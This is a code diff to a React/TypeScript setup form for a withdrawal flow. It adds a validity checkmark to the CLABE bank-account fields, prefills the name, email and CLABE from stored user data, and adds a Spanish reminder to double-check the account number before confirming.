@@ -3,7 +3,7 @@ import { LoadingLogoSlot } from "../components/LoadingLogoSlot";
 import { Logo } from "../components/Logo";
 import { useAppState } from "../context/AppStateContext";
 import { api } from "../lib/api";
-import { digitsOnly, formatClabe, validateClabe } from "../lib/clabe";
+import { digitsOnly, formatClabe, isValidClabe, validateClabe } from "../lib/clabe";
 import { transitionTo } from "../lib/router";
 import { validateEmail, validateNome } from "../lib/rewardProfile";
 
@@ -27,16 +27,18 @@ function Field({
   error,
   hint,
   shaking,
+  className,
   children,
 }: {
   label: string;
   error?: string;
   hint?: string;
   shaking?: boolean;
+  className?: string;
   children: ReactNode;
 }) {
   return (
-    <label className={`field${error ? " is-invalid" : ""}${shaking ? " is-shaking" : ""}`}>
+    <label className={`field${error ? " is-invalid" : ""}${shaking ? " is-shaking" : ""}${className ? ` ${className}` : ""}`}>
       <span className="field-label">{label}</span>
       {children}
       {error ? <p className="field-error">{error}</p> : hint ? <p className="field-hint">{hint}</p> : null}
@@ -48,18 +50,29 @@ function TextInput(props: InputHTMLAttributes<HTMLInputElement>) {
   return <input {...props} />;
 }
 
+function ClabeTick() {
+  return (
+    <span className="clabe-valid-tick" aria-hidden="true">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="11" fill="#14b8a6" />
+        <path d="M7.2 12.4l3.1 3.1 6.5-6.6" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
+      </svg>
+    </span>
+  );
+}
+
 function nomeError(raw: string): string | null {
   if (!raw.trim()) return "Escribe tu nombre completo.";
   return validateNome(raw);
 }
 
 export function Setup() {
-  const { patchUserData } = useAppState();
+  const { patchUserData, userData } = useAppState();
   const [inner, setInner] = useState<InnerStep>(1);
   const [busy, setBusy] = useState(false);
-  const [nome, setNome] = useState("");
-  const [email, setEmail] = useState("");
-  const [clabe, setClabe] = useState("");
+  const [nome, setNome] = useState(userData.nome);
+  const [email, setEmail] = useState(userData.email);
+  const [clabe, setClabe] = useState(() => formatClabe(userData.clabe || userData.chave));
   const [errors, setErrors] = useState<Partial<Record<FieldName, string>>>({});
   const [shaking, setShaking] = useState<Partial<Record<FieldName, boolean>>>({});
   const [loadText, setLoadText] = useState<string>(LOADING_TEXTS[0]);
@@ -214,6 +227,7 @@ export function Setup() {
     "setup-step withdraw-flow-panel" + (inner === 3 ? " is-loading" : "") + (inner === 4 ? " is-review" : "");
   const panelId = inner === 1 ? "five-step1" : inner === 2 ? "five-step2" : inner === 3 ? "five-step3" : "five-step4";
   const clabeDigits = digitsOnly(clabe);
+  const clabeOk = isValidClabe(clabe) && !errors.clabe;
 
   return (
     <div className={panelClass} id={panelId}>
@@ -260,19 +274,22 @@ export function Setup() {
               hint={errors.clabe ? undefined : "18 dígitos · Transferencia SPEI"}
               shaking={shaking.clabe}
             >
-              <TextInput
-                id="clabe-input"
-                type="tel"
-                placeholder="014 027 0000 0555 5558"
-                inputMode="numeric"
-                autoComplete="off"
-                maxLength={22}
-                value={clabe}
-                onChange={(e) => {
-                  setClabe(formatClabe(e.target.value));
-                  clearError("clabe");
-                }}
-              />
+              <span className={`field-input-wrap${clabeOk ? " is-valid" : ""}`}>
+                <TextInput
+                  id="clabe-input"
+                  type="tel"
+                  placeholder="014 027 0000 0555 5558"
+                  inputMode="numeric"
+                  autoComplete="off"
+                  maxLength={22}
+                  value={clabe}
+                  onChange={(e) => {
+                    setClabe(formatClabe(e.target.value));
+                    clearError("clabe");
+                  }}
+                />
+                {clabeOk ? <ClabeTick /> : null}
+              </span>
             </Field>
             <button type="button" id="btn-five-step1" className="btn btn-block btn-square" disabled={busy} onClick={submitProfile}>
               Continuar
@@ -295,22 +312,24 @@ export function Setup() {
             <Field
               label="CLABE"
               error={errors.clabe}
-              hint={errors.clabe ? undefined : "Confirma tu CLABE de 18 dígitos"}
               shaking={shaking.clabe}
             >
-              <TextInput
-                id="pix-key-input"
-                type="tel"
-                placeholder="000 000 0000 0000 0000"
-                inputMode="numeric"
-                autoComplete="off"
-                maxLength={22}
-                value={clabe}
-                onChange={(e) => {
-                  setClabe(formatClabe(e.target.value));
-                  clearError("clabe");
-                }}
-              />
+              <span className={`field-input-wrap${clabeOk ? " is-valid" : ""}`}>
+                <TextInput
+                  id="pix-key-input"
+                  type="tel"
+                  placeholder="000 000 0000 0000 0000"
+                  inputMode="numeric"
+                  autoComplete="off"
+                  maxLength={22}
+                  value={clabe}
+                  onChange={(e) => {
+                    setClabe(formatClabe(e.target.value));
+                    clearError("clabe");
+                  }}
+                />
+                {clabeOk ? <ClabeTick /> : null}
+              </span>
             </Field>
             <button
               type="button"
@@ -323,6 +342,9 @@ export function Setup() {
             >
               Confirmar
             </button>
+            <p className="clabe-confirm-note">
+              Asegúrate de que la CLABE para retirar ingresada sea correcta antes de confirmar.
+            </p>
           </div>
         </>
       ) : null}
